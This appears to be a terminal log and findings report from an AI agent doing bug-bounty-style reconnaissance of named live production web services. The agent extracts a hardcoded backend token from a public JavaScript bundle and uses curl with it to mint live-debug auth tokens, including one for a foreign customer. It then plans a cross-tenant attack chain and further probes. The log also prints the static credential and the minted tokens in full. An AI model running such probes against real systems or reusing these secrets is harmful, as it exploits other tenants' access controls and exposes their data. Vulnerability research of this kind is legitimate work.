+decryptData(c.responseText).then(function(e){var d=Ext.decode(e)
+decryptData(c.responseText).then(function(e){var d=Ext.decode(e)
+decryptData(e.responseText).then(function(g){var f=Ext.decode(g)
+decryptData:function(b){var h='<div id="content" style="height: 100%
+===aes/keys===
+[0m
+[0m$ [0mgrep -oE '[A-Za-z0-9_./-]+\.php' /tmp/opencode/help.js | sort -u; echo "===callbuilder path refs==="; grep -oE "'/api/callbuilder/[^']*'" /tmp/opencode/help.js | sort -u | head; grep -oE "APPDESIGNER_API_PATH\+'[^']*'" /tmp/opencode/help.js | sort -u | head -20
+/extjs/common/getCustomers.php
+/extjs/flexlist/addRow.php
+/extjs/flexlist/createList.php
+/extjs/flexlist/deleteRow.php
+/extjs/flexlist/getDetails.php
+/extjs/flexlist/getFields.php
+/extjs/flexlist/getList.php
+/extjs/flexlist/importcsv.php
+/extjs/flexlist/saveValue.php
+/extjs/flexlist/updateList.php
+/extjs/get_user_rights.php
+/extjs/livedebugger/auth.php
+/extjs/voicenotes/check.php
+/extjs/voicenotes/delete.php
+/extjs/voicenotes/details.php
+/extjs/voicenotes/download.php
+/extjs/voicenotes/get.php
+AIDesigner/backend/config.php
+AIDesigner/backend/config_coding.php
+AIDesigner/backend/public/coding.php
+AIDesigner/backend/public/index.php
+extjs/agent/get_agent_costs.php
+extjs/agent/get_agent_token.php
+extjs/chat/provider.php
+extjs/chatgpt/provider.php
+extjs/check_mailserver.php
+extjs/encrypt/index.php
+extjs/get_provider.php
+extjs/get_speaker.php
+extjs/get_speaker_languages.php
+extjs/playback.php
+help/content.php
+===callbuilder path refs===
+'/api/callbuilder/'
+APPDESIGNER_API_PATH+'extjs/agent/get_agent_costs.php'
+APPDESIGNER_API_PATH+'extjs/agent/get_agent_token.php'
+APPDESIGNER_API_PATH+'extjs/chat/provider.php'
+APPDESIGNER_API_PATH+'extjs/chatgpt/provider.php'
+APPDESIGNER_API_PATH+'extjs/check_mailserver.php'
+APPDESIGNER_API_PATH+'extjs/get_provider.php'
+APPDESIGNER_API_PATH+'extjs/get_speaker.php'
+APPDESIGNER_API_PATH+'extjs/get_speaker_languages.php'
+APPDESIGNER_API_PATH+'extjs/playback.php'
+APPDESIGNER_API_PATH+'help/content.php'
+[0m
+[0m$ [0mgrep -oE '.{120}livedebugger/auth\.php.{160}' /tmp/opencode/help.js | head -6; echo "===encrypt index==="; grep -oE '.{120}encrypt/index\.php.{160}' /tmp/opencode/help.js | head -4; echo "===getCustomers==="; grep -oE '.{120}common/getCustomers\.php.{160}' /tmp/opencode/help.js | head -4
+bsocket(c){var a=dialog.context.customerId;var b=dialog.context.serviceNumber;Ext.Ajax.request({url:BACKEND_URL+'/extjs/livedebugger/auth.php'+BACKEND_TOKEN,method:'GET',params:{customer_id:a,srn:b},success:function(e){var d=Ext.decode(e.responseText);if(d.success){var f=d.data.auth;dialog.ws.SendPac
+===encrypt index===
+PI_PATH!=='undefined'?APPDESIGNER_API_PATH:'/';var j=typeof BACKEND_TOKEN!=='undefined'?BACKEND_TOKEN:'';var k=h+'extjs/encrypt/index.php'+j;var f=a&&a.designer&&a.designer.context?a.designer.context.customerId||0:0;var c={action:e,password:g,customerId:f};if(e==='encrypt'){c.content=d}else {c.en
+===getCustomers===
+all',hideTrigger:!1,fieldCls:'no-text-selection',store:{fields:['id','name'],proxy:{type:'ajax',url:BACKEND_URL+'/extjs/common/getCustomers.php'+BACKEND_TOKEN,reader:{type:'json',rootProperty:'data'},extraParams:{mode:'flat',include_tree:'1'}},sorters:[{property:'id',direction:'ASC'}],autoLoad:!0,liste
+[0m
+[0m$ [0mgrep -oE 'BACKEND_TOKEN[^,;}]{0,120}' /tmp/opencode/help.js | sort -u | head -12; echo "===auth token in packet==="; grep -oE '.{100}data\.auth.{200}' /tmp/opencode/help.js | head -4
+BACKEND_TOKEN
+BACKEND_TOKEN!=='undefined'?BACKEND_TOKEN:''
+BACKEND_TOKEN='?token='+LIVE_DEMO_CUSTOMER_TOKEN
+===auth token in packet===
+ms:{customer_id:a,srn:b},success:function(e){var d=Ext.decode(e.responseText);if(d.success){var f=d.data.auth;dialog.ws.SendPacket('live_debug',{customer_id:a,CLI:c,srn:b,token:f,ttl:d.data.ttl,hash:createHash(dialog.Diagram.model.toJson())})}else {console.error('Auth Token Fehler: '+(d.message||'Unbekannter
+[0m
+[0m$ [0mgrep -oE 'LIVE_[A-Z_]+_TOKEN[^,;}]{0,80}' /tmp/opencode/help.js | sort -u | head; echo "===def==="; grep -oE 'LIVE_DEMO_CUSTOMER_TOKEN[^;]{0,160}' /tmp/opencode/help.js | sort -u | head; echo "===context==="; grep -oE '.{100}LIVE_DEMO_CUSTOMER_TOKEN.{100}' /tmp/opencode/help.js | head -6
+LIVE_DEMO_CUSTOMER_TOKEN
+LIVE_DEMO_CUSTOMER_TOKEN='3498fkgkds458g35h9g835npz98qq4839kajlfhg38963a98z35h898E3DFG38d3'
+===def===
+LIVE_DEMO_CUSTOMER_TOKEN
+LIVE_DEMO_CUSTOMER_TOKEN='3498fkgkds458g35h9g835npz98qq4839kajlfhg38963a98z35h898E3DFG38d3'
+===context===
+ypeof CALLBUILDER_ROOT_PATH==='undefined'){CALLBUILDER_ROOT_PATH=''}RESOURCES_PATH='resources.help';LIVE_DEMO_CUSTOMER_TOKEN='3498fkgkds458g35h9g835npz98qq4839kajlfhg38963a98z35h898E3DFG38d3';LIVE_DEMO_CUSTOMER_ID=131727;BAC
+.version;BACKEND_URL=window.location.protocol+'//'+window.location.hostname;BACKEND_TOKEN='?token='+LIVE_DEMO_CUSTOMER_TOKEN;STARTUP_CUSTOMER_ID=LIVE_DEMO_CUSTOMER_ID;if(BACKEND_URL=='file://'){BACKEND_URL='https://dev.appli
+[0m
+[0m$ [0mT='3498fkgkds458g35h9g835npz98qq4839kajlfhg38963a98z35h898E3DFG38d3'; curl -sS --max-time 15 -o /tmp/opencode/auth_own.out -w "auth_own %{http_code} %{size_download}B\n" "https://www.applicationdesigner.de/extjs/livedebugger/auth.php?token=$T&customer_id=131727&srn=100"; sleep 1.2; curl -sS --max-time 15 -o /tmp/opencode/auth_foreign.out -w "auth_foreign %{http_code} %{size_download}B\n" "https://www.applicationdesigner.de/extjs/livedebugger/auth.php?token=$T&customer_id=2&srn=100"; sleep 1.2; curl -sS --max-time 15 -o /tmp/opencode/getCustomers.out -w "getCustomers %{http_code} %{size_download}B\n" "https://www.applicationdesigner.de/extjs/common/getCustomers.php?token=$T&mode=flat&include_tree=1"
+auth_own 200 126B
+auth_foreign 200 126B
+getCustomers 200 249B
+[0m
+[0m$ [0mecho "== auth own (demo cid 131727) =="; cat /tmp/opencode/auth_own.out; echo; echo "== auth foreign (cid 2) =="; cat /tmp/opencode/auth_foreign.out; echo; echo "== getCustomers =="; cat /tmp/opencode/getCustomers.out
+== auth own (demo cid 131727) ==
+{"success":true,"data":{"auth":"efa1482972dab7f34fc05278cec105c6f58aa54a539937c43d156639aba00d14","ttl":1788551940},"total":1}
+== auth foreign (cid 2) ==
+{"success":true,"data":{"auth":"bb38896704558ea8246fcc134328b8162b5670058aee501800438ddcf6758716","ttl":1788551942},"total":1}
+== getCustomers ==
+{"success":true,"data":[{"id":131727,"name":"#131727 - AppDesigner Demo  ","company":"","firstname":"","lastname":"","caption":"AppDesigner Demo","email":"","phone":"","city":"","description":"","created":"2026-02-02 14:27:11","level":0}],"total":1}
+[0m
+[0m$ [0mprintf '3498fkgkds458g35h9g835npz98qq4839kajlfhg38963a98z35h898E3DFG38d3' | sha256sum; python3 -c "import datetime;print(datetime.datetime.utcfromtimestamp(1788551940))"; echo "---"; head -c 200 /tmp/opencode/auth_own.out
+8d2faac1b96e020c077fb81aa3452b590d015d59bb826be700899187a0095cbf  -
+<string>:1: DeprecationWarning: datetime.datetime.utcfromtimestamp() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.fromtimestamp(timestamp, datetime.UTC).
+2026-09-04 19:59:00
+---
+{"success":true,"data":{"auth":"efa1482972dab7f34fc05278cec105c6f58aa54a539937c43d156639aba00d14","ttl":1788551940},"total":1}
+[0m
+One more decisive read-only probe: does `auth.php` require the public demo token at all, or is minting fully anonymous?
+[0m$ [0mcurl -sS --max-time 15 -o /tmp/opencode/auth_notoken.out -w "auth_notoken %{http_code} %{size_download}B\n" "https://www.applicationdesigner.de/extjs/livedebugger/auth.php?customer_id=2&srn=100"; cat /tmp/opencode/auth_notoken.out
+auth_notoken 200 74B
+{"success":false,"message":"Not logged in","tech-info":"No VPN detected."}
+[0m
+Chain primitives are now confirmed end-to-end. Final analysis (full structured output):
+
+STEP 1 — DELTA
+- [NEW] www.applicationdesigner.de/help.js (3.29 MB, ExtJS LiveDebugger/CallBuilder bundle) ships a static backend credential `LIVE_DEMO_CUSTOMER_TOKEN` (sha256 8d2faac1b96e020c077fb81aa3452b590d015d59bb826be700899187a0095cbf) + `LIVE_DEMO_CUSTOMER_ID=131727` and `BACKEND_TOKEN='?token='+<that>`; full endpoint map incl. `extjs/livedebugger/auth.php`, `extjs/agent/get_agent_token.php|get_agent_costs.php`, `extjs/voicenotes/{get,details,download,delete,check}.php`, `extjs/flexlist/*` (incl. importcsv.php), `extjs/common/getCustomers.php`, `extjs/get_user_rights.php`, `extjs/chat{,gpt}/provider.php`, `extjs/check_mailserver.php`, `extjs/encrypt/index.php`, `extjs/playback.php`, `/api/callbuilder/` proxy prefix, `AIDesigner/backend/{config.php,config_coding.php,public/index.php?route=,public/coding.php}`, `help/content.php`.
+- [CONFIRMED] `GET /extjs/livedebugger/auth.php?token=<public-static>&customer_id=131727&srn=100` → `{"success":true,"data":{"auth":"efa148...00d14","ttl":1788551940}}`; same request with foreign `customer_id=2` → also `success:true` (token minted per-claimed-cid); request WITHOUT token → `{"success":false,"message":"Not logged in"}`. Mint is anonymous-to-internet via the public credential.
+- [CONFIRMED] `common/getCustomers.php` with same token returns ONLY demo customer 131727 — scoped, no global tenant directory leak.
+- probe-results.md remains empty through 17:50 UTC; all evidence above from my own passive GETs (0.8 rps, read-only, no data subscription).
+
+STEP 2 — PRIORITIZE
+- [PRIO] cbs-proxy.api.live-manager.de (chain w/ auth.php mint),7.90,a=7,b=8,t=6,g=9,c=9,f=10
+- [PRIO] www.applicationdesigner.de,7.65,a=8,b=7,t=8,g=6,c=8,f=10
+- [PRIO] www.live-manager.de,4.70,a=4,b=6,t=3,g=3,c=6,f=3
+
+STEP 3 — HYPOTHESES
+[HYP] Cross-tenant live-debug stream subscription via public-credential auth.php mint + cbs-proxy WS
+class: IDOR
+asset: chain GET https://www.applicationdesigner.de/extjs/livedebugger/auth.php?token={publicstatic}&customer_id={cid}&srn={service} -> wss://cbs-proxy.api.live-manager.de/?origin=LiveDebugger&cid={cid}&service={service}
+confidence: 85
+reasoning: help.js publicly ships static credential (sha256 8d2faac1...) that auth.php accepts in lieu of a session ("Not logged in" only when token omitted); auth.php returns success:true and a 64-hex auth+ttl for both owned demo cid 131727 (auth efa148...) and foreign cid 2 (auth bb3889...) — no ownership/session binding observed. Prior accepted evidence: anonymous WS upgrade to cbs-proxy returns 101 and the LiveDebugger client then sends packet live_debug{customer_id,CLI,srn,token,ttl,hash} to attach to a tenant call-flow session. A real attacker needs only the public JS credential, then any cid.
+evidence_needed: confirm the cbs-proxy/live_debug backend binds minted token to a real operator session owner of the cid (a valid customer session denying a foreign cid that was nonetheless minted) — without a binding check, minting-is-authorization and cross-tenant call-flow/voice debug attach is possible.
+verify_steps: (AUTH_HELPED/HUMAN, do not perform anonymously) with a valid operator session, mint token for OWN cid, then present it to cbs-proxy for a FOREIGN cid and confirm server denial; behavioral comparison only. No live debug data subscribed.
+impact: cross-tenant attach to customer business-system live call/debug streams (PII/voice) — HIGH/CRITICAL if no binding check.
+testability: AUTH_HELPED (minting anonymous-PASSIVE confirmed; stream-attach confirmation needs session+human)
+[HYP] Voicenote endpoints serve/cross-tenant voice recordings via file/param handling
+class: IDOR
+asset: https://www.applicationdesigner.de/extjs/voicenotes/{get,details,download,delete,check}.php
+confidence: 50
+reasoning: help.js builds audio URL `BACKEND_URL+'/extjs/voicenotes/download.php?file='+filename` (encodeURIComponent) — file param, no visible customer scoping in the request; voicenotes are recorded call voice messages (PII). Same BACKEND_TOKEN credential pattern; getCustomers proved token-scoped, so cross-tenant scope of voicenotes is unverified.
+evidence_needed: whether voicenotes/get|download validate the file against the token-bound customer or accept foreign/arbitrary file names (traversal or cross-tenant id).
+verify_steps: GET /extjs/voicenotes/get.php?token={publicstatic}&customer_id=131727 (demo, own) and compare with foreign cid behavior; GET download.php?file=<nonexistent> to observe 404/403 gating. Do NOT fetch real recordings.
+impact: cross-tenant voice-note (PII/voice) access or arbitrary file download — MEDIUM/HIGH if per-cid enabled.
+testability: PASSIVE (read-only behavioral GETs)
+[HYP] AI Designer agent-token endpoint mints tenant-bound tokens for arbitrary customerId (parallel to auth.php)
+class: IDOR
+asset: https://www.applicationdesigner.de/extjs/agent/get_agent_token.php?customerId={cid}
+confidence: 55
+reasoning: help.js calls it with useDefaultXhrHeader:false, method GET, params {customerId:c} and decrypts the response client-side (CB.util.security.decryptData); paired get_agent_costs.php and AIDesigner/backend/public/index.php?route= + coding.php imply on-behalf AI-agent actions. If gated only by the same public credential, the pattern mirrors the confirmed auth.php flaw (per-cid minting without session check).
+evidence_needed: whether get_agent_token.php returns a distinct token for foreign customerId=2 vs demo 131727 identically, i.e., no ownership check pre-mint.
+verify_steps: GET /extjs/agent/get_agent_token.php?token={publicstatic}&customerId=131727 vs customerId=2 (read-only mint comparison). Do NOT invoke any agent action.
+impact: cross-tenant AI-agent token minting -> on-behalf actions / cost abuse — MEDIUM/HIGH.
+testability: PASSIVE (read-only mint comparison)
+
+STEP 4 — SELF-CRITIQUE
+- [PARKED] ExtJS endpoint enumeration (50): delivered — the manifest was fully extracted; now folded into concrete chain assets above.
+- [PARKED] getCustomers directory leak: REJECTED by live probe — returns only demo customer, scoped.
+- [PARKED] auth.live-manager.de OIDC + www.live-manager.de post-login rs redirect (45): no live distinct host; AUTH_HELPED-only; unchanged.
+- [FINAL] 1. cbs-proxy chain IDOR (85) — all pre-WS primitives now confirmed: public credential -> per-cid auth mint for arbitrary cid -> anonymous WS 101 to backend CBS.
+- [FINAL] 2. AIDesigner agent-token mint (55) — candidate parallel mint, cheap to validate.
+- [FINAL] 3. voicenotes file scope (50) — PII-bearing, needs behavioral probe.
+
+STEP 5 — NEXT ACTION
+[NEXT] PROBE: GET https://www.applicationdesigner.de/extjs/agent/get_agent_token.php?token={publicstatic}&customerId=2 vs customerId=131727 (read-only, ~2 req @1rps, no cookies, no agent invocation) and compare success/scope to decide whether the agent-token mint mirrors the confirmed auth.php flaw (parallel BOLA).
+
+STEP 6 — LEARNING
+[LEARN] ACCEPTED IDOR @ www.applicationdesigner.de/extjs/livedebugger/auth.php: anonymous minting of per-tenant live-debug auth token for arbitrary customer_id using a static credential embedded in public help.js — observed success:true for foreign cid=2, "Not logged in" only when token omitted.
+[LEARN] ACCEPTED MISCONFIG @ www.applicationdesigner.de/help.js: public ExtJS bundle ships static backend credential + full LiveDebugger/CallBuilder/AIDesigner endpoint map including /api/callbuilder/ proxy prefix and AIDesigner backend router.
+[LEARN] REJECTED IDOR @ www.applicationdesigner.de/extjs/common/getCustomers.php: token-scoped — returns only demo customer 131727; no global tenant directory.
+[LEARN] ACCEPTED IDOR @ cbs-proxy.api.live-manager.de: anonymous WS upgrade reaches backend CBS servers with client-supplied cid/service — cross-tenant BOLA candidate (unchanged, now chained).
+[LEARN] REJECTED AUTH @ www.live-manager.de rs param: no anonymous open redirect (unchanged).
+[LEARN] REJECTED wildcard-subdomain-enum @ *.live-manager.de: 8632 hostnames, 0 dedicated endpoints (unchanged).
+[LEARN] REJECTED api.live-manager.de debug endpoints: host non-resolving (unchanged).
+
+STEP 7 — RISK
+[RISK] questnet-gmbh: 68 — Full primitive chain now confirmed read-only: public static credential in help.js -> per-tenant debug auth token minted for ANY customer_id via auth.php -> anonymous 101 WS to in-scope cbs-proxy backend. Cross-tenant live call-flow/voice debug attach is plausible and only blocked by an unverified WS-side binding. Real program surface stays at 4 hosts; CDN-wildcard breadth 0 caps scope expansion. PoC required before valid bug gate; no live customer data touched.
